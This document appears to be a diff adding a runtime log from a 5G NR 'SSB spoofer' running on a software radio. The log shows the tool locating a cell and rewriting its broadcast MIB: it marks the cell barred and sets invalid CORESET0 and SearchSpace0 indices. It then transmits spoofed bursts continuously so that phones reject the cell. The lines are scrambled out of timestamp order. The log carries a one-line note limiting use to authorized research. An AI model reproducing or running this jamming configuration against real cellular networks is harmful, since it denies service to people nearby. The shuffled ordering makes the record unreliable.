@@ -1,0 +1,129 @@
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mdevice: uhd
+[2026-10-23T20:30:36+00:00] ----------------------------------------------------------------------
+[2026-10-23T20:30:36+00:00] [!!!] SSB FOUND! | PCI: 1 | SNR: 25.1dB | RSRP: -7.9dBm | SSB#0
+[2026-10-23T20:30:34+00:00] [34m[2026-10-23 20:30:34] DEBUG: [0m --------------------------------------------------------
+[2026-10-23T20:30:34+00:00] [34m[2026-10-23 20:30:34] DEBUG: [0m>> Loading configuration from: /spoofer.yaml
+[2026-10-23T20:30:36+00:00] Subcarrier Spacing Common: 15 kHz
+[2026-10-23T20:30:35+00:00] Opening USRP channels=1, args: type=b200,serial=318898A,master_clock_rate=23.04e6
+[2026-10-23T20:30:36+00:00] === SSB Spoofing Attack Configured ===
+[2026-10-23T20:30:35+00:00] Subcarrier spacing: 15 kHz
+[2026-10-23T20:30:36+00:00] [*] Initializing receiver... Ready!
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:36+00:00] Done!
+[2026-10-23T20:30:35+00:00] Sample rate: 23.04 MHz
+[2026-10-23T20:30:36+00:00] [INFO] Keeping SSB Offset: 6
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] === Modifying MIB for SSB Spoofing Attack ===
+[2026-10-23T20:30:34+00:00] [INFO] [B200] Initialize CODEC control...
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] TRANSMISSION DASHBOARD
+[2026-10-23T20:30:36+00:00] [ATTACK] CORESET0 Index: 12 -> 15 (invalid PDCCH config)
+[2026-10-23T20:30:35+00:00] Actual RX frequency: 1842.05 MHz
+[2026-10-23T20:30:35+00:00] Setting RX gain: 40 dB
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Actually got clock rate 23.040000 MHz.
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mpattern: A
+[2026-10-23T20:30:36+00:00] CORESET0 Index: 12
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0m[RF]
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mscan for target: yes
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mRX freq: 1842.050 MHz
+[2026-10-23T20:30:34+00:00] 5G NR SSB Spoofer v1.0
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:36+00:00] SSB SCAN | PCI: 1 | Duration: 30s | RX Buffer: 23040 samples
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mburst interval: 2000 us
+[2026-10-23T20:30:36+00:00] DMRS TypeA Position: 0
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mTX gain: 60.00 dB
+[2026-10-23T20:30:36+00:00] [INFO] Keeping SFN: 891 (for timing consistency)
+[2026-10-23T20:30:36+00:00] SearchSpace Zero Index: 0
+[2026-10-23T20:30:35+00:00] Setting RX frequency: 1842.05 MHz
+[2026-10-23T20:30:35+00:00] SSB frequency: 1842.05 MHz
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] Samples/Burst:    23040  |  Burst Length:      1ms  |  Interval:  2.00ms
+[2026-10-23T20:30:34+00:00] [INFO] [B200] Detected Device: B210
+[2026-10-23T20:30:35+00:00] Setting TX gain: 60 dB
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0m[Attack]
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Register loopback test passed
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mSCS: 15 kHz
+[2026-10-23T20:30:34+00:00] Opening RF device...
+[2026-10-23T20:30:36+00:00] [INFO] Keeping DMRS position: 0
+[2026-10-23T20:30:34+00:00] [INFO] [B200] Operating over USB 3.
+[2026-10-23T20:30:35+00:00] SSB pattern: A
+[2026-10-23T20:30:36+00:00] SSB processor configured successfully
+[2026-10-23T20:30:36+00:00] === MIB Information ===
+[2026-10-23T20:30:34+00:00] Inactive RF plugins:
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:35+00:00] [34m[2026-10-23 20:30:35] DEBUG: [0m  --------------------------------------------------------
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:34+00:00] [INFO] [B200] Initialize Radio control...
+[2026-10-23T20:30:34+00:00] ========================================================================
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mRX gain: 40.00 dB
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mmodify CORESET0: yes
+[2026-10-23T20:30:34+00:00] Inactive RF plugins:
+[2026-10-23T20:30:36+00:00] Sample Rate:   23.04MHz  |  Burst Rate:    333.3/s  |  TX Gain:    60.0dB
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mcontinuous TX: yes
+[2026-10-23T20:30:36+00:00] TX stream ready (will start on first transmission)
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Performing register loopback test...
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:34+00:00] [INFO] [UHD] linux; GNU C++ version 14.2.0; Boost_108400; UHD_4.7.0.0
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0margs: type=b200,serial=318898A
+[2026-10-23T20:30:34+00:00] Active RF plugins: libsrsran_rf_uhd.so libsrsran_rf_zmq.so
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mmodify cell_barred: yes
+[2026-10-23T20:30:35+00:00] Actual RX sample rate: 23.04 MHz
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mTX freq: 1842.050 MHz
+[2026-10-23T20:30:35+00:00] [34m[2026-10-23 20:30:35] DEBUG: [0m --------------------------------------------------------
+[2026-10-23T20:30:36+00:00] Intra-Freq Reselection: Allowed
+[2026-10-23T20:30:36+00:00] SFN: 891
+[2026-10-23T20:30:35+00:00] RF device initialized successfully
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mmax bursts: unlimited
+[2026-10-23T20:30:35+00:00] Actual TX frequency: 1842.05 MHz
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Asking for clock rate 23.040000 MHz...
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mperiod: 10 ms
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mtarget PCI: 1
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Performing register loopback test...
+[2026-10-23T20:30:35+00:00] Center frequency: 1842.05 MHz
+[2026-10-23T20:30:34+00:00] [INFO] [UHD RF] RF UHD Generic instance constructed
+[2026-10-23T20:30:34+00:00] [34m[2026-10-23 20:30:34] DEBUG: [0m            Initializing RF Device
+[2026-10-23T20:30:35+00:00] [34m[2026-10-23 20:30:35] DEBUG: [0m            Initializing SSB Processor
+[2026-10-23T20:30:36+00:00] [*] Generating signal... Done! (23040 samples)
+[2026-10-23T20:30:34+00:00] None
+[2026-10-23T20:30:34+00:00] WARNING: For authorized security research and testing only!
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] Cell Barred: No
+[2026-10-23T20:30:35+00:00] Setting RX sample rate: 23.04 MHz
+[2026-10-23T20:30:34+00:00] ========================================================================
+[2026-10-23T20:30:34+00:00] None
+[2026-10-23T20:30:36+00:00] CONTINUOUS ATTACK IS ACTIVATED
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0m[Burst Control]
+[2026-10-23T20:30:35+00:00] Trying to open RF device 'UHD'
+[2026-10-23T20:30:35+00:00] Setting TX frequency: 1842.05 MHz
+[2026-10-23T20:30:34+00:00] Active RF plugins: libsrsran_rf_uhd.so libsrsran_rf_zmq.so
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:34+00:00] [INFO] [LOGGING] Fastpath logging disabled at runtime.
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:36+00:00] Half Radio Frame: No
+[2026-10-23T20:30:35+00:00] RF device 'UHD' successfully opened
+[2026-10-23T20:30:35+00:00] Supported RF device list: UHD zmq file
+[2026-10-23T20:30:35+00:00] [INFO] [B200] Register loopback test passed
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:36+00:00] Target: PCI 1 | Max: unlimited bursts | Press Ctrl+C to stop
+[2026-10-23T20:30:34+00:00] [34m[2026-10-23 20:30:34] DEBUG: [0m  --------------------------------------------------------
+[2026-10-23T20:30:57+00:00] ● TX: >>>    Bursts:      50    <<< | Rate:  247.5 b/s | Time:   0.2s |            ◉ TX:  >>>   Bursts:     100   <<<  | Rate:  325.7 b/s | Time:   0.3s /            ○ TX:   >>>  Bursts:     150  <<<   | Rate:  364.1 b/s | Time:   0.4s -            ◉ TX:    >>> Bursts:     200 <<<    | Rate:  386.1 b/s | Time:   0.5s \            ● TX: >>>    Bursts:     250    <<< | Rate:  401.3 b/s | Time:   0.6s |            ◉ TX:  >>>   Bursts:     300   <<<  | Rate:  411.5 b/s | Time:   0.7s /            ○ TX:   >>>  Bursts:     350  <<<   | Rate:  419.2 b/s | Time:   0.8s -            ◉ TX:    >>> Bursts:     400 <<<    | Rate:  425.1 b/s | Time:   0.9s \            ● TX: >>>    Bursts:     450    <<< | Rate:  429.8 b/s | Time:   1.0s |            ◉ TX:  >>>   Bursts:     500   <<<  | Rate:  434.0 b/s | Time:   1.2s /            ○ TX:   >>>  Bursts:     550  <<<   | Rate:  437.2 b/s | Time:   1.3s -            ◉ TX:    >>> Bursts:     600 <<<    | Rate:  440.2 b/s | Time:   1.4s \            ● TX: >>>    Bursts:     650    <<< | Rate:  442.8 b/s | Time:   1.5s |            ◉ TX:  >>>   Bursts:     700   <<<  | Rate:  445.0 b/s | Time:   1.6s /            ○ TX:   >>>  Bursts:     750  <<<   | Rate:  446.7 b/s | Time:   1.7s -            ◉ TX:    >>> Bursts:     800 <<<    | Rate:  448.7 b/s | Time:   1.8s \            ● TX: >>>    Bursts:     850    <<< | Rate:  450.0 b/s | Time:   1.9s |            ◉ TX:  >>>   Bursts:     900   <<<  | Rate:  451.6 b/s | Time:   2.0s /            ○ TX:   >>>  Bursts:     950  <<<   | Rate:  452.6 b/s | Time:   2.1s -            ◉ TX:    >>> Bursts:    1000 <<<    | Rate:  453.7 b/s | Time:   2.2s \            ● TX: >>>    Bursts:    1050    <<< | Rate:  454.5 b/s | Time:   2.3s |            ◉ TX:  >>>   Bursts:    1100   <<<  | Rate:  455.3 b/s | Time:   2.4s /            ○ TX:   >>>  Bursts:    1150  <<<   | Rate:  456.2 b/s | Time:   2.5s -            ◉ TX:    >>> Bursts:    1200 <<<    | Rate:  456.8 b/s | Time:   2.6s \            ● TX: >>>    Bursts:    1250    <<< | Rate:  457.5 b/s | Time:   2.7s |            ◉ TX:  >>>   Bursts:    1300   <<<  | Rate:  458.2 b/s | Time:   2.8s /            ○ TX:   >>>  Bursts:    1350  <<<   | Rate:  458.9 b/s | Time:   2.9s -            ◉ TX:    >>> Bursts:    1400 <<<    | Rate:  459.5 b/s | Time:   3.0s \            ● TX: >>>    Bursts:    1450    <<< | Rate:  460.0 b/s | Time:   3.2s |            ◉ TX:  >>>   Bursts:    1500   <<<  | Rate:  460.7 b/s | Time:   3.3s /            ○ TX:   >>>  Bursts:    1550  <<<   | Rate:  461.2 b/s | Time:   3.4s -            ◉ TX:    >>> Bursts:    1600 <<<    | Rate:  461.5 b/s | Time:   3.5s \            ● TX: >>>    Bursts:    1650    <<< | Rate:  461.8 b/s | Time:   3.6s |            ◉ TX:  >>>   Bursts:    1700   <<<  | Rate:  462.2 b/s | Time:   3.7s /            ○ TX:   >>>  Bursts:    1750  <<<   | Rate:  462.5 b/s | Time:   3.8s -            ◉ TX:    >>> Bursts:    1800 <<<    | Rate:  462.8 b/s | Time:   3.9s \            ● TX: >>>    Bursts:    1850    <<< | Rate:  463.2 b/s | Time:   4.0s |            ◉ TX:  >>>   Bursts:    1900   <<<  | Rate:  463.4 b/s | Time:   4.1s /            ○ TX:   >>>  Bursts:    1950  <<<   | Rate:  463.7 b/s | Time:   4.2s -            ◉ TX:    >>> Bursts:    2000 <<<    | Rate:  463.9 b/s | Time:   4.3s \            ● TX: >>>    Bursts:    2050    <<< | Rate:  464.3 b/s | Time:   4.4s |            ◉ TX:  >>>   Bursts:    2100   <<<  | Rate:  464.5 b/s | Time:   4.5s /            ○ TX:   >>>  Bursts:    2150  <<<   | Rate:  464.8 b/s | Time:   4.6s -            ◉ TX:    >>> Bursts:    2200 <<<    | Rate:  464.9 b/s | Time:   4.7s \            ● TX: >>>    Bursts:    2250    <<< | Rate:  465.1 b/s | Time:   4.8s |            ◉ TX:  >>>   Bursts:    2300   <<<  | Rate:  465.3 b/s | Time:   4.9s /            ○ TX:   >>>  Bursts:    2350  <<<   | Rate:  465.4 b/s | Time:   5.0s -            ◉ TX:    >>> Bursts:    2400 <<<    | Rate:  465.7 b/s | Time:   5.2s \            ● TX: >>>    Bursts:    2450    <<< | Rate:  465.9 b/s | Time:   5.3s |            ◉ TX:  >>>   Bursts:    2500   <<<  | Rate:  466.1 b/s | Time:   5.4s /            ○ TX:   >>>  Bursts:    2550  <<<   | Rate:  466.3 b/s | Time:   5.5s -            ◉ TX:    >>> Bursts:    2600 <<<    | Rate:  466.5 b/s | Time:   5.6s \            ● TX: >>>    Bursts:    2650    <<< | Rate:  466.6 b/s | Time:   5.7s |            ◉ TX:  >>>   Bursts:    2700   <<<  | Rate:  466.7 b/s | Time:   5.8s /            ○ TX:   >>>  Bursts:    2750  <<<   | Rate:  466.9 b/s | Time:   5.9s -            ◉ TX:    >>> Bursts:    2800 <<<    | Rate:  467.0 b/s | Time:   6.0s \            ● TX: >>>    Bursts:    2850    <<< | Rate:  467.1 b/s | Time:   6.1s |            ◉ TX:  >>>   Bursts:    2900   <<<  | Rate:  467.2 b/s | Time:   6.2s /            ○ TX:   >>>  Bursts:    2950  <<<   | Rate:  467.3 b/s | Time:   6.3s -            ◉ TX:    >>> Bursts:    3000 <<<    | Rate:  467.4 b/s | Time:   6.4s \            ● TX: >>>    Bursts:    3050    <<< | Rate:  467.6 b/s | Time:   6.5s |            ◉ TX:  >>>   Bursts:    3100   <<<  | Rate:  467.7 b/s | Time:   6.6s /            ○ TX:   >>>  Bursts:    3150  <<<   | Rate:  467.8 b/s | Time:   6.7s -            ◉ TX:    >>> Bursts:    3200 <<<    | Rate:  468.0 b/s | Time:   6.8s \            ● TX: >>>    Bursts:    3250    <<< | Rate:  468.1 b/s | Time:   6.9s |            ◉ TX:  >>>   Bursts:    3300   <<<  | Rate:  468.2 b/s | Time:   7.0s /            ○ TX:   >>>  Bursts:    3350  <<<   | Rate:  468.3 b/s | Time:   7.2s -            ◉ TX:    >>> Bursts:    3400 <<<    | Rate:  468.4 b/s | Time:   7.3s \            ● TX: >>>    Bursts:    3450    <<< | Rate:  468.5 b/s | Time:   7.4s |            ◉ TX:  >>>   Bursts:    3500   <<<  | Rate:  468.6 b/s | Time:   7.5s /            ○ TX:   >>>  Bursts:    3550  <<<   | Rate:  468.6 b/s | Time:   7.6s -            ◉ TX:    >>> Bursts:    3600 <<<    | Rate:  468.8 b/s | Time:   7.7s \            ● TX: >>>    Bursts:    3650    <<< | Rate:  468.9 b/s | Time:   7.8s |            ◉ TX:  >>>   Bursts:    3700   <<<  | Rate:  468.9 b/s | Time:   7.9s /            ○ TX:   >>>  Bursts:    3750  <<<   | Rate:  469.0 b/s | Time:   8.0s -            ◉ TX:    >>> Bursts:    3800 <<<    | Rate:  469.1 b/s | Time:   8.1s \            ● TX: >>>    Bursts:    3850    <<< | Rate:  469.2 b/s | Time:   8.2s |            ◉ TX:  >>>   Bursts:    3900   <<<  | Rate:  469.3 b/s | Time:   8.3s /            ○ TX:   >>>  Bursts:    3950  <<<   | Rate:  469.4 b/s | Time:   8.4s -            ◉ TX:    >>> Bursts:    4000 <<<    | Rate:  469.5 b/s | Time:   8.5s \            ● TX: >>>    Bursts:    4050    <<< | Rate:  469.6 b/s | Time:   8.6s |            ◉ TX:  >>>   Bursts:    4100   <<<  | Rate:  469.6 b/s | Time:   8.7s /            ○ TX:   >>>  Bursts:    4150  <<<   | Rate:  469.7 b/s | Time:   8.8s -            ◉ TX:    >>> Bursts:    4200 <<<    | Rate:  469.7 b/s | Time:   8.9s \            ● TX: >>>    Bursts:    4250    <<< | Rate:  469.8 b/s | Time:   9.0s |            ◉ TX:  >>>   Bursts:    4300   <<<  | Rate:  469.8 b/s | Time:   9.2s /            ○ TX:   >>>  Bursts:    4350  <<<   | Rate:  469.9 b/s | Time:   9.3s -            ◉ TX:    >>> Bursts:    4400 <<<    | Rate:  469.9 b/s | Time:   9.4s \            ● TX: >>>    Bursts:    4450    <<< | Rate:  470.0 b/s | Time:   9.5s |            ◉ TX:  >>>   Bursts:    4500   <<<  | Rate:  470.1 b/s | Time:   9.6s /            ○ TX:   >>>  Bursts:    4550  <<<   | Rate:  470.1 b/s | Time:   9.7s -            ◉ TX:    >>> Bursts:    4600 <<<    | Rate:  470.3 b/s | Time:   9.8s \            ● TX: >>>    Bursts:    4650    <<< | Rate:  470.3 b/s | Time:   9.9s |            ◉ TX:  >>>   Bursts:    4700   <<<  | Rate:  470.3 b/s | Time:  10.0s /            ○ TX:   >>>  Bursts:    4750  <<<   | Rate:  470.3 b/s | Time:  10.1s -            ◉ TX:    >>> Bursts:    4800 <<<    | Rate:  470.4 b/s | Time:  10.2s \            ● TX: >>>    Bursts:    4850    <<< | Rate:  470.4 b/s | Time:  10.3s |            ◉ TX:  >>>   Bursts:    4900   <<<  | Rate:  470.5 b/s | Time:  10.4s /            ○ TX:   >>>  Bursts:    4950  <<<   | Rate:  470.6 b/s | Time:  10.5s -            ◉ TX:    >>> Bursts:    5000 <<<    | Rate:  470.6 b/s | Time:  10.6s \            ● TX: >>>    Bursts:    5050    <<< | Rate:  470.6 b/s | Time:  10.7s |            ◉ TX:  >>>   Bursts:    5100   <<<  | Rate:  470.7 b/s | Time:  10.8s /            ○ TX:   >>>  Bursts:    5150  <<<   | Rate:  470.7 b/s | Time:  10.9s -            ◉ TX:    >>> Bursts:    5200 <<<    | Rate:  470.8 b/s | Time:  11.0s \            ● TX: >>>    Bursts:    5250    <<< | Rate:  470.8 b/s | Time:  11.2s |            ◉ TX:  >>>   Bursts:    5300   <<<  | Rate:  470.9 b/s | Time:  11.3s /            ○ TX:   >>>  Bursts:    5350  <<<   | Rate:  470.9 b/s | Time:  11.4s -            ◉ TX:    >>> Bursts:    5400 <<<    | Rate:  470.8 b/s | Time:  11.5s \            ● TX: >>>    Bursts:    5450    <<< | Rate:  470.9 b/s | Time:  11.6s |            ◉ TX:  >>>   Bursts:    5500   <<<  | Rate:  470.9 b/s | Time:  11.7s /            ○ TX:   >>>  Bursts:    5550  <<<   | Rate:  470.9 b/s | Time:  11.8s -            ◉ TX:    >>> Bursts:    5600 <<<    | Rate:  470.9 b/s | Time:  11.9s \            ● TX: >>>    Bursts:    5650    <<< | Rate:  470.9 b/s | Time:  12.0s |            ◉ TX:  >>>   Bursts:    5700   <<<  | Rate:  470.9 b/s | Time:  12.1s /            ○ TX:   >>>  Bursts:    5750  <<<   | Rate:  471.0 b/s | Time:  12.2s -            ◉ TX:    >>> Bursts:    5800 <<<    | Rate:  470.9 b/s | Time:  12.3s \            ● TX: >>>    Bursts:    5850    <<< | Rate:  470.9 b/s | Time:  12.4s |            ◉ TX:  >>>   Bursts:    5900   <<<  | Rate:  470.9 b/s | Time:  12.5s /            ○ TX:   >>>  Bursts:    5950  <<<   | Rate:  471.0 b/s | Time:  12.6s -            ◉ TX:    >>> Bursts:    6000 <<<    | Rate:  471.0 b/s | Time:  12.7s \            ● TX: >>>    Bursts:    6050    <<< | Rate:  471.0 b/s | Time:  12.8s |            ◉ TX:  >>>   Bursts:    6100   <<<  | Rate:  471.0 b/s | Time:  13.0s /            ○ TX:   >>>  Bursts:    6150  <<<   | Rate:  471.0 b/s | Time:  13.1s -            ◉ TX:    >>> Bursts:    6200 <<<    | Rate:  471.0 b/s | Time:  13.2s \            ● TX: >>>    Bursts:    6250    <<< | Rate:  471.0 b/s | Time:  13.3s |            ◉ TX:  >>>   Bursts:    6300   <<<  | Rate:  471.0 b/s | Time:  13.4s /            ○ TX:   >>>  Bursts:    6350  <<<   | Rate:  471.0 b/s | Time:  13.5s -            ◉ TX:    >>> Bursts:    6400 <<<    | Rate:  471.0 b/s | Time:  13.6s \            ● TX: >>>    Bursts:    6450    <<< | Rate:  471.0 b/s | Time:  13.7s |            ◉ TX:  >>>   Bursts:    6500   <<<  | Rate:  471.0 b/s | Time:  13.8s /            ○ TX:   >>>  Bursts:    6550  <<<   | Rate:  471.1 b/s | Time:  13.9s -            ◉ TX:    >>> Bursts:    6600 <<<    | Rate:  471.1 b/s | Time:  14.0s \            ● TX: >>>    Bursts:    6650    <<< | Rate:  471.1 b/s | Time:  14.1s |            ◉ TX:  >>>   Bursts:    6700   <<<  | Rate:  471.1 b/s | Time:  14.2s /            ○ TX:   >>>  Bursts:    6750  <<<   | Rate:  471.1 b/s | Time:  14.3s -            ◉ TX:    >>> Bursts:    6800 <<<    | Rate:  471.1 b/s | Time:  14.4s \            ● TX: >>>    Bursts:    6850    <<< | Rate:  471.1 b/s | Time:  14.5s |            ◉ TX:  >>>   Bursts:    6900   <<<  | Rate:  471.2 b/s | Time:  14.6s /            ○ TX:   >>>  Bursts:    6950  <<<   | Rate:  471.2 b/s | Time:  14.8s -            ◉ TX:    >>> Bursts:    7000 <<<    | Rate:  471.2 b/s | Time:  14.9s \            ● TX: >>>    Bursts:    7050    <<< | Rate:  471.2 b/s | Time:  15.0s |            ◉ TX:  >>>   Bursts:    7100   <<<  | Rate:  471.2 b/s | Time:  15.1s /            ○ TX:   >>>  Bursts:    7150  <<<   | Rate:  471.3 b/s | Time:  15.2s -            ◉ TX:    >>> Bursts:    7200 <<<    | Rate:  471.3 b/s | Time:  15.3s \            ● TX: >>>    Bursts:    7250    <<< | Rate:  471.3 b/s | Time:  15.4s |            ◉ TX:  >>>   Bursts:    7300   <<<  | Rate:  471.3 b/s | Time:  15.5s /            ○ TX:   >>>  Bursts:    7350  <<<   | Rate:  471.3 b/s | Time:  15.6s -            ◉ TX:    >>> Bursts:    7400 <<<    | Rate:  471.3 b/s | Time:  15.7s \            ● TX: >>>    Bursts:    7450    <<< | Rate:  471.3 b/s | Time:  15.8s |            ◉ TX:  >>>   Bursts:    7500   <<<  | Rate:  471.3 b/s | Time:  15.9s /            ○ TX:   >>>  Bursts:    7550  <<<   | Rate:  471.4 b/s | Time:  16.0s -            ◉ TX:    >>> Bursts:    7600 <<<    | Rate:  471.4 b/s | Time:  16.1s \            ● TX: >>>    Bursts:    7650    <<< | Rate:  471.4 b/s | Time:  16.2s |            ◉ TX:  >>>   Bursts:    7700   <<<  | Rate:  471.4 b/s | Time:  16.3s /            ○ TX:   >>>  Bursts:    7750  <<<   | Rate:  471.4 b/s | Time:  16.4s -            ◉ TX:    >>> Bursts:    7800 <<<    | Rate:  471.4 b/s | Time:  16.5s \            ● TX: >>>    Bursts:    7850    <<< | Rate:  471.5 b/s | Time:  16.6s |            ◉ TX:  >>>   Bursts:    7900   <<<  | Rate:  471.5 b/s | Time:  16.8s /            ○ TX:   >>>  Bursts:    7950  <<<   | Rate:  471.5 b/s | Time:  16.9s -            ◉ TX:    >>> Bursts:    8000 <<<    | Rate:  471.4 b/s | Time:  17.0s \            ● TX: >>>    Bursts:    8050    <<< | Rate:  471.4 b/s | Time:  17.1s |            ◉ TX:  >>>   Bursts:    8100   <<<  | Rate:  471.5 b/s | Time:  17.2s /            ○ TX:   >>>  Bursts:    8150  <<<   | Rate:  471.5 b/s | Time:  17.3s -            ◉ TX:    >>> Bursts:    8200 <<<    | Rate:  471.5 b/s | Time:  17.4s \            ● TX: >>>    Bursts:    8250    <<< | Rate:  471.5 b/s | Time:  17.5s |            ◉ TX:  >>>   Bursts:    8300   <<<  | Rate:  471.5 b/s | Time:  17.6s /            ○ TX:   >>>  Bursts:    8350  <<<   | Rate:  471.5 b/s | Time:  17.7s -            ◉ TX:    >>> Bursts:    8400 <<<    | Rate:  471.5 b/s | Time:  17.8s \            ● TX: >>>    Bursts:    8450    <<< | Rate:  471.5 b/s | Time:  17.9s |            ◉ TX:  >>>   Bursts:    8500   <<<  | Rate:  471.5 b/s | Time:  18.0s /            ○ TX:   >>>  Bursts:    8550  <<<   | Rate:  471.5 b/s | Time:  18.1s -            ◉ TX:    >>> Bursts:    8600 <<<    | Rate:  471.5 b/s | Time:  18.2s \            ● TX: >>>    Bursts:    8650    <<< | Rate:  471.5 b/s | Time:  18.3s |            ◉ TX:  >>>   Bursts:    8700   <<<  | Rate:  471.5 b/s | Time:  18.5s /            ○ TX:   >>>  Bursts:    8750  <<<   | Rate:  471.5 b/s | Time:  18.6s -            ◉ TX:    >>> Bursts:    8800 <<<    | Rate:  471.5 b/s | Time:  18.7s \            ● TX: >>>    Bursts:    8850    <<< | Rate:  471.5 b/s | Time:  18.8s |            ◉ TX:  >>>   Bursts:    8900   <<<  | Rate:  471.5 b/s | Time:  18.9s /            ○ TX:   >>>  Bursts:    8950  <<<   | Rate:  471.5 b/s | Time:  19.0s -            ◉ TX:    >>> Bursts:    9000 <<<    | Rate:  471.5 b/s | Time:  19.1s \            ● TX: >>>    Bursts:    9050    <<< | Rate:  471.6 b/s | Time:  19.2s |            ◉ TX:  >>>   Bursts:    9100   <<<  | Rate:  471.6 b/s | Time:  19.3s /            ○ TX:   >>>  Bursts:    9150  <<<   | Rate:  471.6 b/s | Time:  19.4s -            ◉ TX:    >>> Bursts:    9200 <<<    | Rate:  471.6 b/s | Time:  19.5s \            ● TX: >>>    Bursts:    9250    <<< | Rate:  471.5 b/s | Time:  19.6s |            ◉ TX:  >>>   Bursts:    9300   <<<  | Rate:  471.5 b/s | Time:  19.7s /            ○ TX:   >>>  Bursts:    9350  <<<   | Rate:  471.5 b/s | Time:  19.8s -            ◉ TX:    >>> Bursts:    9400 <<<    | Rate:  471.5 b/s | Time:  19.9s \            ● TX: >>>    Bursts:    9450    <<< | Rate:  471.5 b/s | Time:  20.0s |            ◉ TX:  >>>   Bursts:    9500   <<<  | Rate:  471.5 b/s | Time:  20.1s /            ○ TX:   >>>  Bursts:    9550  <<<   | R
+[2026-10-23T20:30:36+00:00] SSB Index: 0
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0msrate: 23.040 MHz
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0mburst length: 1 ms
+[2026-10-23T20:30:36+00:00] [*] Modifying MIB...
+[2026-10-23T20:30:35+00:00] Initializing SSB processor...
+[2026-10-23T20:30:35+00:00] Configuring SSB processor...
+[2026-10-23T20:30:36+00:00] None
+[2026-10-23T20:30:36+00:00] [*] Encoding MIB... Done!
+[2026-10-23T20:30:36+00:00] ATTACK PREPARATION | Generating Spoofed SSB for PCI 1
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0m[SSB]
+[2026-10-23T20:30:36+00:00] [ATTACK] SearchSpace0 Index: 0 -> 15 (invalid SIB1 search space)
+[2026-10-23T20:30:36+00:00] SSB Offset: 6
+[2026-10-23T20:30:34+00:00] ========================================================================
+[2026-10-23T20:30:36+00:00] [ATTACK] Cell Barred: false -> true (UE will reject this cell)
+[2026-10-23T20:30:36+00:00] =======================
+[2026-10-23T20:30:36+00:00] ======================================================================
+[2026-10-23T20:30:34+00:00] [32m[2026-10-23 20:30:34] INFO : [0m---- Configuration ----
